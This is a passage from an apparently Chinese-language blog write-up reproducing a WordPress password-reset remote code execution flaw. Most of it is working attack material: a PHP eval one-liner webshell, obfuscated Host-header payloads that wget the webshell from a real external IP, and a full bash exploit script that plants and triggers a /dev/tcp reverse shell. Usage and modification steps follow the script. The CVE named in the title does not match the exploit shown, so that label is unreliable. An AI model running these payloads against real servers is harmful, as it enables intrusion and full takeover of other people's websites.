<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -lvnp 12345<br></code></pre></td></tr></tbody></table></figure>
<p>![image-20230829162742888](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829162742888.png)</p>
<h4 id="写入一句话webshell">写入一句话webshell</h4>
<p>1.txt内容：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>同理，可以直接下载一句话webshell，然后菜刀连接。payload：</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/1.php 124.220.233.26/1.txt}} null)<br></code></pre></td></tr></tbody></table></figure>
<p>转换过来即</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{aa(any${substr{10}{1}{$tod_log}}-froot@localhost${substr{10}{1}{$tod_log}}-be${substr{10}{1}{$tod_log}}${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}1.php${substr{10}{1}{$tod_log}}ip${substr{0}{1}{$spool_directory}}1.txt}}${substr{10}{1}{$tod_log}}null)}} null)<br></code></pre></td></tr></tbody></table></figure>
<p>![image-20230825203125950](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825203125950.png)</p>
<h2 id="0x05-POC">0x05 POC</h2>
<p>自动化提交 payload，获取反弹 shell。通过 <code>python -mSimpleHTTPServer</code> 80 建立 web 服务，用于目标下载 shell。运行是需要用管理员权限，因为监听了 80 端口。</p>
<p>使用方法<br>
攻击机上运行./exp.sh [<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>](<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>)即可 其中xx.xx.xx.xx为靶机wordpress的根地址</p>
<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#      __                     __   __  __           __</span><br><span class="hljs-comment">#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________</span><br><span class="hljs-comment">#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/</span><br><span class="hljs-comment">#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&lt; /  __/ /  (__  )</span><br><span class="hljs-comment">#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/</span><br><span class="hljs-comment">#            /____/</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit</span><br><span class="hljs-comment"># CVE-2016-10033</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># wordpress-rce-exploit.sh (ver. 1.0)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Discovered and coded by</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Dawid Golunski (@dawid_golunski)</span><br><span class="hljs-comment"># https://legalhackers.com</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># ExploitBox project:</span><br><span class="hljs-comment"># https://ExploitBox.io</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Full advisory URL:</span><br><span class="hljs-comment"># https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Exploit src URL:</span><br><span class="hljs-comment"># https://exploitbox.io/exploit/wordpress-rce-exploit.sh</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Tested on WordPress 4.6:</span><br><span class="hljs-comment"># https://github.com/WordPress/WordPress/archive/4.6.zip</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment"># ./wordpress-rce-exploit.sh target-wordpress-url</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Disclaimer:</span><br><span class="hljs-comment"># For testing purposes only</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># -----------------------------------------------------------------</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Interested in vulns/exploitation?</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#                        .;lc'</span><br><span class="hljs-comment">#                    .,cdkkOOOko;.</span><br><span class="hljs-comment">#                 .,lxxkkkkOOOO000Ol'</span><br><span class="hljs-comment">#             .':oxxxxxkkkkOOOO0000KK0x:'</span><br><span class="hljs-comment">#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.</span><br><span class="hljs-comment">#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.</span><br><span class="hljs-comment">#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.</span><br><span class="hljs-comment">#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:</span><br><span class="hljs-comment">#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxdl;. .,               .. .;cdxxxxxx:</span><br><span class="hljs-comment">#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:</span><br><span class="hljs-comment">#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.</span><br><span class="hljs-comment">#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.</span><br><span class="hljs-comment">#             .':oxxxxxxxxx.ckkkkkkkkxl,.</span><br><span class="hljs-comment">#                 .,cdxxxxx.ckkkkkxc.</span><br><span class="hljs-comment">#                    .':odx.ckxl,.</span><br><span class="hljs-comment">#                        .,.'.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># https://ExploitBox.io</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># https://twitter.com/Exploit_Box</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># -----------------------------------------------------------------</span><br> <br>rev_host=<span class="hljs-string">"124.220.233.26"</span><br> <br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">prep_host_header</span></span>() {<br>      cmd=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span><br>      rce_cmd=<span class="hljs-string">"\${run{<span class="hljs-variable">$cmd</span>}}"</span>;<br> <br>      <span class="hljs-comment"># replace / with ${substr{0}{1}{$spool_directory}}</span><br>      <span class="hljs-comment">#sed 's^/^${substr{0}{1}{$spool_directory}}^g'</span><br>      rce_cmd=<span class="hljs-string">"`echo <span class="hljs-variable">$rce_cmd</span> | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"</span><br> <br>      <span class="hljs-comment"># replace ' ' (space) with</span><br>      <span class="hljs-comment">#sed 's^ ^${substr{10}{1}{$tod_log}}$^g'</span><br>      rce_cmd=<span class="hljs-string">"`echo <span class="hljs-variable">$rce_cmd</span> | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"</span><br>      <span class="hljs-comment">#return "target(any -froot@localhost -be $rce_cmd null)"</span><br>      host_header=<span class="hljs-string">"target(any -froot@localhost -be <span class="hljs-variable">$rce_cmd</span> null)"</span><br>      <span class="hljs-built_in">return</span> 0<br>}<br> <br><span class="hljs-comment">#cat exploitbox.ans</span><br>intro=<span class="hljs-string">"</span><br><span class="hljs-string">DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r</span><br><span class="hljs-string">bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f</span><br><span class="hljs-string">G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c</span><br><span class="hljs-string">G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg</span><br><span class="hljs-string">IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f</span><br><span class="hljs-string">IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f</span><br><span class="hljs-string">X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6</span><br><span class="hljs-string">b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb</span><br><span class="hljs-string">NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N</span><br><span class="hljs-string">TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1</span><br><span class="hljs-string">QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz</span><br><span class="hljs-string">NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g</span><br><span class="hljs-string">G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54</span><br><span class="hljs-string">eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb</span><br><span class="hljs-string">WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO</span><br><span class="hljs-string">TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg</span><br><span class="hljs-string">ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb</span><br><span class="hljs-string">MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD</span><br><span class="hljs-string">G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob</span><br><span class="hljs-string">WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz</span><br><span class="hljs-string">NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb</span><br><span class="hljs-string">MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f</span><br><span class="hljs-string">X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4</span><br><span class="hljs-string">bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"</span><br>intro2=<span class="hljs-string">"</span><br><span class="hljs-string">ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09</span><br><span class="hljs-string">fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb</span><br><span class="hljs-string">MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="hljs-string">ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE</span><br><span class="hljs-string">aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09</span><br><span class="hljs-string">fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg</span><br><span class="hljs-string">ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh</span><br><span class="hljs-string">bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt</span><br><span class="hljs-string">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt</span><br><span class="hljs-string">ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp</span><br><span class="hljs-string">bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1</span><br><span class="hljs-string">cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg=="</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$intro</span>"</span>  | <span class="hljs-built_in">base64</span> -d<br><span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$intro2</span>"</span> | <span class="hljs-built_in">base64</span> -d<br> <br><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$#</span>"</span> -ne 1 ]; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"Usage:\n<span class="hljs-variable">$0</span> target-wordpress-url\n"</span><br><span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br>target=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span><br><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[91m[*]\033[0m"</span><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">" Sure you want to get a shell on the target '<span class="hljs-variable">$target</span>' ? [y/N] "</span> choice<br><span class="hljs-built_in">echo</span><br> <br><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$choice</span>"</span> == <span class="hljs-string">"y"</span> ]; <span class="hljs-keyword">then</span><br> <br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[+]\033[0m Connected to the target"</span><br> <br><span class="hljs-comment"># Serve payload/bash script on :80</span><br>RCE_exec_cmd=<span class="hljs-string">"(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/<span class="hljs-variable">$rev_host</span>/5555 0&lt;&amp;1 2&gt;&amp;1) &amp;"</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$RCE_exec_cmd</span>"</span> &gt; rce.txt<br>python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;<br>hpid=$!<br> <br><span class="hljs-comment"># Save payload on the target in /tmp/rce</span><br>cmd=<span class="hljs-string">"/usr/bin/curl -o/tmp/rce <span class="hljs-variable">$rev_host</span>/rce.txt"</span><br>prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span><br>curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -s -d <span class="hljs-string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\e[0m Payload sent successfully"</span><br> <br><span class="hljs-comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span><br>cmd=<span class="hljs-string">"/bin/bash /tmp/rce"</span><br>prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span><br>curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -d <span class="hljs-string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword &amp;<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\033[0m Payload executed!"</span><br> <br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"</span><br>nc -nvv -l -p 5555<br><span class="hljs-built_in">echo</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"</span><br><span class="hljs-built_in">exit</span> 0<br> <br><span class="hljs-keyword">fi</span><br> <br><span class="hljs-built_in">echo</span> <span class="hljs-string">"Exiting..."</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></tbody></table></figure>
<h3 id="脚本需要修改的部分">脚本需要修改的部分</h3>
<p>三个地方 第一处 #1 line 1</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">rev_host="192.168.57.1" #1<br></code></pre></td></tr></tbody></table></figure>
<p>这边要替换成你的攻击机的ip地址，一般是和靶机处在一个局域网内的，可以提前访问下wordpress的网站进行测试。<br>
第二处 #2 line 75</p>
<p>第三处 #3 line 80</p>
<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -s -d <span class="hljs-string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword <span class="hljs-comment">#2</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\e[0m Payload sent successfully"</span><br><span class="hljs-comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span><br>cmd=<span class="hljs-string">"/bin/bash /tmp/rce"</span><br>prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span><br>curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -d <span class="hljs-string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword &amp; <span class="hljs-comment">#3</span><br></code></pre></td></tr></tbody></table></figure>
<p>这两个地方主要要修改的可能是user_login=admin这个参数，这个poc里默认的是admin<br>
这里其实就是你装wordpress时管理员的或者任意一个用户的邮箱<br>
因为找回密码时他会先判断邮箱是否存在，再进行下一步<br>
如果这里邮箱不存在 你发包是返回200 告诉你邮箱不存在<br>
如果是存在有的邮箱，就是返回302跳转到输入邮箱密码的界面 同时告诉你邮件已经发了<br>
下面是burp模拟攻击时候的抓包 返回的是302时说明已经命令执行成功</p>
<p>![image-20230829164046765](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164046765.png)</p>
<p>可以看到靶机上也确实出现了rce文件</p>
<p>这边执行的命令是<code>/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt</code></p>
<p>![image-20230829164134260](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164134260.png)</p>
<p>这三个地方改好了之后，脚本就可以运行了</p>
<h3 id="脚本的主要流程：">脚本的主要流程：</h3>
<blockquote>
<ol>
<li>生成本地rce.txt 里面写的是是建立连接的命令</li>
<li>命令执行第一次 curl攻击机获取rce.txt 写到/tmp目录下</li>
<li>命令执行第二次 运行tmp目录下的rce</li>
<li>nc连接靶机</li>
</ol>
</blockquote>
<h2 id="0x06-漏洞原理深入">0x06 漏洞原理深入</h2>
<p>将docker中的wordpress源码拷贝出来<code>sudo docker cp pwnscriptum_web_1:/var/www/html /home/jgc/code</code></p>
<p>根据忘记密码页面的url<code>wp-login.php?action=lostpassword</code>定位到<code>wp-login.php</code>的<code>retrieve_password</code>函数，此函数是对密码的操作函数。</p>
<p>此函数中对用户输入进行处理后，最后通过以下代码发送邮件</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retrieve_password</span>(<span class="hljs-params"></span>) </span>{<br>	......<br>        <br>	<span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'retrieve_password_message'</span>, <span class="hljs-variable">$message</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$user_login</span>, <span class="hljs-variable">$user_data</span> );<br><br>	<span class="hljs-keyword">if</span> ( <span class="hljs-variable">$message</span> &amp;&amp; !<span class="hljs-title function_ invoke__">wp_mail</span>( <span class="hljs-variable">$user_email</span>, <span class="hljs-title function_ invoke__">wp_specialchars_decode</span>( <span class="hljs-variable">$title</span> ), <span class="hljs-variable">$message</span> ) )<br>		<span class="hljs-title function_ invoke__">wp_die</span>( <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">'The email could not be sent.'</span>) . <span class="hljs-string">"&lt;br /&gt;\n"</span> . <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">'Possible reason: your host may have disabled the mail() function.'</span>) );<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>跟进<code>wp_mail</code>函数，定位到<code>/wp-includes/pluggable.php</code></p>
<p>函数中其中关于host的设置如下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$from_name</span> ) )<br>		<span class="hljs-variable">$from_name</span> = <span class="hljs-string">'WordPress'</span>;<br><br>	<span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$from_email</span> ) ) {<br>		<span class="hljs-comment">// Get the site domain and get rid of www.</span><br>		<span class="hljs-variable">$sitename</span> = <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>] );<br>		<span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$sitename</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span> ) == <span class="hljs-string">'www.'</span> ) {<br>			<span class="hljs-variable">$sitename</span> = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$sitename</span>, <span class="hljs-number">4</span> );<br>		}<br><br>		<span class="hljs-variable">$from_email</span> = <span class="hljs-string">'wordpress@'</span> . <span class="hljs-variable">$sitename</span>;<br>	}<br><br>	<span class="hljs-variable">$from_email</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'wp_mail_from'</span>, <span class="hljs-variable">$from_email</span> );<br><br>	<span class="hljs-variable">$from_name</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'wp_mail_from_name'</span>, <span class="hljs-variable">$from_name</span> );<br><br>	<span 